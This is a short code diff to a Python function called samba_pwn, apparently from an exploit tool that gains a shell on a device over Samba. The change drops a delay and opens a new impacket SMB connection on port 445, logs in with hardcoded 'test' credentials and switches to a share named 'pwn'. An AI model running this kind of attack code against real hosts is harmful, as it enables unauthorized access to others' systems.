@@ -26,10 +26,10 @@ def samba_pwn(host,nousb):
         sleep(1)
         print(".",end="")
     print()
-    print("[Samba_pwn]: Waiting 5 secs before initiating payload")
-    sleep(5)
     print("[Samba_pwn]: Opening shell")
-    shell.onecmd("login")
-    shell.onecmd("use pwn")
+    smbClient2 = SMBConnection(host, host, sess_port=int(445))
+    smbClient2.login("test", "test", "", "", "")
+    shell2 = MiniImpacketShell(smbClient2)
+    shell2.onecmd("use pwn")
 
 
